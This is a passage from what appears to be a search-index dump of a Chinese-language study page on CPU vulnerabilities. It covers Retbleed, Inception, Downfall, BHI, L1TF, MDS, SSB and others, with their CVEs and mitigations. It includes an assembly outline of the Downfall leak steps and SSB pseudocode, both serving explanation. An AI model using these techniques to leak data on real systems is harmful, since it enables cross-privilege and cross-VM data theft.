<li>\u200b\u7ee7\u7eed\u200b\u589e\u52a0\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5b57\u8282\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u5185\u5bb9\u200b\uff1a<code>%s version %s (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) %s</code></li> </ul> </li> <li>Meltdown \u200b\u7684\u200b\u53d8\u79cd\u200b\uff1aMeltdown variant 3a, Meltdown-CPL-REG, Rogue System Register Read, CVE-2018-3640, lgeek/spec_poc_arm \u200b\u628a\u200b Meltdown \u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u6539\u6210\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u8bfb\u53d6\u200b System Register\uff0c\u200b\u800c\u200b\u8fd9\u200b\u672c\u6765\u200b\u662f\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u624d\u80fd\u200b\u8bfb\u53d6\u200b\u7684\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#retbleed-return-stack-buffer-underflow","title":"Retbleed (Return Stack Buffer Underflow)","text":"<ul> <li>Retbleed</li> <li>CVE-2022-29900</li> <li>CVE-2022-29901</li> <li>Return Stack Buffer Underflow</li> <li>\u200b\u987e\u540d\u601d\u4e49\u200b\uff0c\u200b\u9488\u5bf9\u200b\u7684\u200b\u662f\u200b Return Stack Buffer\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6808\u200b\uff0ccall \u200b\u7684\u200b\u65f6\u5019\u200b\u538b\u6808\u200b\uff0cret \u200b\u7684\u200b\u65f6\u5019\u200b\u5f39\u6808\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b ret \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6808\u200b\u5df2\u7ecf\u200b\u7a7a\u200b\u4e86\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u8c13\u200b\u7684\u200b Underflow\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u6709\u200b\u4ec0\u4e48\u6837\u200b\u7684\u200b\u884c\u4e3a\u200b\uff1f</li> <li>\u200b\u5728\u200b\u90e8\u5206\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cret \u200b\u7684\u200b\u9884\u6d4b\u200b\u4f1a\u200b\u4ea4\u7ed9\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u53bb\u200b\u9884\u6d4b\u200b\uff0c\u200b\u800c\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5728\u200b\u4e4b\u524d\u200b Spectre Variant 2 Branch Target Injection \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u88ab\u200b\u653b\u51fb\u200b\u8fc7\u200b\u4e86\u200b</li> <li>Intel \u200b\u5904\u7406\u5668\u200b\u5bf9\u200b Return Stack Buffer Underflow \u200b\u7684\u200b\u5904\u7406\u200b\u65b9\u5f0f\u200b\u6709\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\u7c7b\u578b\u200b\uff1a<ul> <li>RSB Alternate (RSBA)\uff1aRSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u7528\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b ret\uff0c\u200b\u4f1a\u200b\u53d7\u5230\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u7ea7\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u6709\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b</li> <li>Restricted RSB Alternate (RRSBA): RSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u7528\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b ret\uff0c\u200b\u5982\u679c\u200b\u6253\u5f00\u200b\u4e86\u200b eIBRS\uff0c\u200b\u5219\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u7ea7\u200b\u4e0b\u200b\u7684\u200b\u9884\u6d4b\u200b\u4e0d\u4f1a\u200b\u53d7\u5230\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u7ea7\u200b\u7684\u200b\u5f71\u54cd\u200b\uff08\u200b\u4f8b\u5982\u200b\u7528\u6237\u200b\u6001\u200b\u65e0\u6cd5\u200b\u5f71\u54cd\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\uff09</li> <li>RRSBA_DIS_S: \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u914d\u7f6e\u200b <code>IA32_SPEC_CTRL.RRSBA_DIS_S = 1</code>\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b RSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u4e0d\u53bb\u200b\u9884\u6d4b\u200b ret \u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>RSB stuffing/filling</li> <li>RRSBA_DIS_S</li> <li>untrained return thunk</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#speculative-return-stack-overflow-srsospec-rstack-overflowinception","title":"Speculative Return Stack Overflow (SRSO/Spec rstack overflow/INCEPTION)","text":"<ul> <li>Speculative Return Stack Overflow (SRSO)</li> <li>Inception: how a simple XOR can cause a Microarchitectural Stack Overflow</li> <li>TECHNICAL UPDATE REGARDING SPECULATIVE RETURN STACK OVERFLOW</li> <li>CVE-2023-20569</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>ret \u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7531\u200b Return Stack Buffer \u200b\u6765\u200b\u9884\u6d4b\u200b\uff0c\u200b\u9884\u6d4b\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5339\u914d\u200b\u7684\u200b call</li> <li>\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0ccall \u200b\u548c\u200b ret \u200b\u662f\u200b\u53ef\u4ee5\u200b\u914d\u5bf9\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b ret \u200b\u4f1a\u200b\u88ab\u200b\u9884\u6d4b\u200b\u5230\u200b call \u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u4e0a\u200b</li> <li>\u200b\u5728\u200b AMD \u200b\u7684\u200b\u4e00\u4e9b\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0cBTB \u200b\u662f\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b alias \u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b BTB Entry \u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b</li> <li>\u200b\u5982\u679c\u200b\u4e24\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b BTB Entry \u200b\u4e0a\u200b\uff0c\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u6709\u200b call\uff0c\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u6ca1\u6709\u200b\uff0c\u200b\u5047\u5982\u200b\u901a\u8fc7\u200b\u6267\u884c\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u8ba9\u200b BTB \u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u7684\u200b call \u200b\u6307\u4ee4\u200b\u4fe1\u606f\u200b\uff0c\u200b\u90a3\u4e48\u200b BTB \u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8ba4\u4e3a\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u4e5f\u200b\u6709\u200b call\uff0c\u200b\u5373\u4f7f\u200b\u5b9e\u9645\u4e0a\u200b\u5e76\u200b\u6ca1\u6709\u200b</li> <li>\u200b\u5728\u200b BTB \u200b\u9884\u6d4b\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u6709\u200b call \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u66f4\u65b0\u200b Return Stack Buffer \u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5f71\u54cd\u200b\u4e86\u200b\u540e\u7eed\u200b ret \u200b\u6307\u4ee4\u200b\u7684\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u5b9e\u9645\u4e0a\u200b\u5e76\u200b\u6ca1\u6709\u200b call \u200b\u6307\u4ee4\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff0cBTB \u200b\u4e5f\u200b\u8981\u200b\u7528\u200b full tag \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u4e0d\u200b\u5141\u8bb8\u200b alias</li> <li>Safe RET</li> <li>Indirect Branch Prediction Barrier (IBPB)</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#gather-data-sampling-downfall","title":"Gather Data Sampling (DOWNFALL)","text":"<ul> <li>Downfall Attacks</li> <li>\u200b\u8bba\u6587\u200b Downfall: Exploiting Speculative Data Gathering</li> <li>Gather Data Sampling</li> <li>CVE-2022-40982</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>Intel \u200b\u5904\u7406\u5668\u200b\u5728\u200b\u5b9e\u73b0\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u628a\u200b Gather \u200b\u8bfb\u53d6\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u200b\u7684\u200b Buffer \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e2a\u200b Buffer \u200b\u662f\u200b\u6ca1\u6709\u200b\u9694\u79bb\u200b\u7684\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4f1a\u7528\u200b\u540c\u4e00\u4e2a\u200b</li> <li>\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u8fdb\u884c\u200b\u6b63\u5e38\u200b\u7684\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u4e5f\u200b\u8fdb\u884c\u200b\u4e00\u4e2a\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\uff0c\u200b\u7531\u4e8e\u200b Buffer \u200b\u7684\u200b\u5171\u4eab\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5728\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b SIMD Gather \u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b SIMD Gather \u200b\u7ed3\u679c\u200b</li> <li>\u200b\u8fd9\u4e2a\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6eda\u200b\u5e76\u200b\u7ea0\u6b63\u200b\u4e3a\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u4f46\u662f\u200b\u56de\u6eda\u524d\u200b\uff0c\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u4f20\u64ad\u200b\u51fa\u53bb\u200b\u4e86\u200b</li> <li>\u200b\u4e8e\u662f\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u901a\u8fc7\u200b\u7f13\u5b58\u200b\u7684\u200b\u4fa7\u200b\u4fe1\u9053\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63a8\u6d4b\u200b\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u8bfb\u53d6\u200b\u4e86\u200b\u4ec0\u4e48\u200b\u6570\u636e\u200b\uff1a     <pre><code>// Step (i): Increase the transient window\nlea addresses_normal, %rdi\nclflush (%rdi)\nmov (%rdi), %rax\n\n// Step (ii): Gather uncacheable memory\nlea addresses_uncacheable, %rsi\nmov $0b1, %rdi\nkmovq %rdi, %k1\nvpxord %zmm1, %zmm1, %zmm1\nvpgatherdd 0(%rsi, %zmm1, 1), %zmm5{%k1}\n\n// Step (iii): Encode (transient) data to cache\nmovq %xmm5, %rax\nencode_eax\n\n// Step (iv): Scan the cache\nscan_flush_reload\n</code></pre></li> <li>\u200b\u4e3a\u4e86\u200b\u6269\u5927\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u7684\u200b\u7a97\u53e3\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u4fe1\u606f\u200b\u80fd\u591f\u200b\u901a\u8fc7\u200b\u7f13\u5b58\u200b\u4fa7\u200b\u4fe1\u9053\u200b\u4f20\u9012\u200b\u51fa\u6765\u200b\uff0c\u200b\u5728\u200b\u4e0a\u8ff0\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u9996\u5148\u200b\u8bbf\u95ee\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u518d\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u8bbf\u95ee\u200b\u65e0\u6cd5\u200b\u7f13\u5b58\u200b\u7684\u200b\u5185\u5b58\u200b</li> <li>\u200b\u8fdb\u4e00\u6b65\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e0d\u4ec5\u200b\u80fd\u591f\u200b\u6cc4\u9732\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u200b\u5176\u4ed6\u200b\u5f88\u591a\u200b SIMD Load \u200b\u6307\u4ee4\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u7528\u200b SIMD Gather \u200b\u6cc4\u9732\u200b\u51fa\u6765\u200b</li> <li>\u200b\u8fdb\u4e00\u6b65\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e0d\u4ec5\u200b\u80fd\u591f\u200b\u6cc4\u9732\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u5185\u200b\u7684\u200b\u6570\u636e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u5185\u6838\u200b\u6001\u200b\u6cc4\u9732\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b Microcode \u200b\u4fee\u590d\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#branch-history-injectionintra-mode-bti-imbti","title":"Branch History Injection/Intra-mode BTI (IMBTI)","text":"<ul> <li>Branch History Injection/Intra-mode BTI</li> <li>CVE-2022-0001</li> <li>CVE-2022-0002</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u7528\u4e8e\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u7684\u200b Branch History Buffer\uff08BHB\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b Path History Register\uff09\u200b\u6ca1\u6709\u200b\u5728\u200b\u7279\u6743\u200b\u6001\u200b\u4e4b\u95f4\u200b\u9694\u79bb\u200b</li> <li>IBRS/eIBRS \u200b\u9694\u79bb\u200b\u4e86\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u4f46\u200b\u6ca1\u6709\u200b\u9694\u79bb\u200b BHB\uff0c\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u5411\u200b BHB \u200b\u6ce8\u5165\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u6765\u200b\u64cd\u63a7\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Retpoline</li> <li>Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS)</li> <li>Supervisor-Mode Execution Prevention (SMEP)</li> <li>BHI_DIS_S</li> <li>IPRED_DIS_S</li> <li>Software BHB Clearing</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#itlb-multihit","title":"ITLB Multihit","text":"<ul> <li>iTLB multihit</li> <li>CVE-2018-12207</li> <li>INTEL-SA-00210 Intel\u00ae Processor Machine Check Error Advisory</li> <li>iTLB multihit from linux docs</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>ITLB Multihit \u200b\u662f\u200b\u4e00\u4e2a\u200b DoS \u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u5bbf\u4e3b\u673a\u200b\u6b7b\u673a\u200b</li> <li>\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u7684\u200b\u5185\u6838\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4fee\u6539\u200b\u9875\u8868\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u51fa\u73b0\u200b\u5728\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u9875\u8868\u200b\u5bf9\u5e94\u200b\u7684\u200b ITLB \u200b\u8868\u9879\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5bbf\u4e3b\u673a\u200b\u51fa\u73b0\u200b Machine Check Error\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u5de5\u4f5c\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5bbf\u4e3b\u673a\u200b\u89c2\u6d4b\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u9875\u8868\u200b\uff0c\u200b\u5982\u679c\u200b\u865a\u62df\u673a\u200b\u5206\u914d\u200b\u4e86\u200b\u53ef\u200b\u6267\u884c\u200b\u7684\u200b\u5927\u9875\u200b\uff0c\u200b\u5219\u200b\u5bbf\u4e3b\u673a\u200b\u628a\u200b\u5b83\u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b 4K \u200b\u5927\u5c0f\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b\u95ee\u9898\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#l1-terminal-fault-l1tf-foreshadow","title":"L1 Terminal Fault (L1TF, Foreshadow)","text":"<ul> <li>L1TF - L1 Terminal Fault from linux docs</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5904\u7406\u5668\u200b\u5728\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u65e0\u89c6\u200b\u6389\u200b\u9875\u8868\u200b\u9879\u200b\u7684\u200b Present bit\uff0c\u200b\u5373\u4f7f\u200b\u5b83\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u5bfc\u81f4\u200b page fault\uff0c\u200b\u4f46\u200b\u8fd8\u662f\u200b\u4f1a\u200b\u6267\u884c\u200b/\u200b\u8bfb\u53d6\u200b\u5b83\u200b\u6307\u5411\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u7684\u200b\u6307\u4ee4\u200b/\u200b\u6570\u636e\u200b</li> </ul> </li> <li>\u200b\u73af\u8282\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>PTE inversion\uff1a\u200b\u907f\u514d\u200b Present bit \u200b\u8bbe\u200b\u4e3a\u200b 0 \u200b\u7684\u200b\u9875\u8868\u200b\u9879\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u7684\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u7f13\u5b58\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u5185\u5b58\u200b\u4e2d\u200b\u6570\u636e\u200b\u7684\u200b\u6cc4\u6f0f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#microarchitectural-data-sampling-mds","title":"Microarchitectural Data Sampling (MDS)","text":"<ul> <li>MDS - Microarchitectural Data Sampling</li> <li>Microarchitectural Data Sampling (MDS) mitigation</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5904\u7406\u5668\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0cload \u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e00\u4e9b\u200b\u5148\u524d\u200b\u6307\u4ee4\u200b\u6216\u8005\u200b\u7f13\u5b58\u200b refill \u200b\u83b7\u53d6\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u6765\u81ea\u200b\u9519\u8bef\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u6cc4\u9732\u200b\u4e86\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5373\u4f7f\u200b\u8fd9\u200b\u6761\u200b load \u200b\u6307\u4ee4\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6eda\u200b\uff0c\u200b\u4f46\u200b\u53ef\u80fd\u200b\u628a\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b\u4fa7\u200b\u4fe1\u9053\u200b\u6cc4\u9732\u200b\u51fa\u53bb\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5207\u6362\u200b\u7279\u6743\u200b\u7ea7\u200b\u6216\u200b\u5728\u200b\u5bbf\u4e3b\u673a\u200b\u548c\u200b\u865a\u62df\u673a\u200b\u4e4b\u95f4\u200b\u5207\u6362\u200b\u65f6\u200b\uff0c\u200b\u6e05\u7a7a\u200b\u5fae\u200b\u67b6\u6784\u200b\u4e0a\u200b\u7684\u200b\u72b6\u6001\u200b\u4ee5\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u6cc4\u9732\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#register-file-data-sampling","title":"Register File Data Sampling","text":"<ul> <li>Register File Data Sampling / CVE-2023-28746 / INTEL-SA-00898</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5728\u200b\u90e8\u5206\u200b Atom \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0c<code>VERW</code> \u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u6f0f\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65e7\u503c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65e7\u503c\u200b\u53ef\u80fd\u200b\u6765\u81ea\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u6216\u8005\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5347\u7ea7\u200b Microcode</li> <li>\u200b\u4e3b\u52a8\u200b\u6267\u884c\u200b <code>VERW</code> \u200b\u6307\u4ee4\u200b\u6765\u200b\u907f\u514d\u200b\u65e7\u503c\u200b\u88ab\u200b\u540e\u7eed\u200b\u4ee3\u7801\u200b\u6cc4\u6f0f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#speculative-store-bypass-ssb","title":"Speculative Store Bypass (SSB)","text":"<ul> <li>Speculative Store Bypass / CVE-2018-3639 / INTEL-SA-00115</li> <li>\u200b\u53c8\u79f0\u200b Spectre Variant 4</li> <li> <p>\u200b\u539f\u7406\u200b\uff1a</p> <ul> <li>\u200b\u5904\u7406\u5668\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b load \u200b\u6307\u4ee4\u6027\u200b\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u9884\u6d4b\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u6570\u636e\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u54ea\u6761\u200b store \u200b\u6307\u4ee4\u200b\u83b7\u53d6\u200b</li> <li>\u200b\u5982\u679c\u200b\u6b3a\u9a97\u200b\u8fd9\u4e2a\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u8ba9\u200b\u5b83\u200b\u9884\u6d4b\u200b load\uff08\u200b\u4e0b\u9762\u200b\u7684\u200b <code>Y = ...</code>\uff09\u200b\u4ece\u200b\u9519\u8bef\u200b\u7684\u200b store \u200b\u6307\u4ee4\u200b\u5904\u200b\uff08\u200b\u4e0b\u9762\u200b\u7684\u200b <code>X = &amp;K</code>\uff09\u200b\u83b7\u53d6\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e00\u4e2a\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u7a97\u53e3\u200b\u4e2d\u200b\u64cd\u63a7\u200b load \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u800c\u200b\u6cc4\u9732\u200b\u6570\u636e\u200b\uff1a</li> </ul> <p><pre><code>X = &amp;K;    // Attacker manages to get variable with address of K stored into pointer X\n&lt;at some later point&gt;\nX = &amp;M;      // Does a store of address of M to pointer X\nY = Array[*X &amp; 0xFFFF]; // Dereferences address of M which is in pointer X in order to\n      // load from array at index specified by M[15:0]\n</code></pre> - 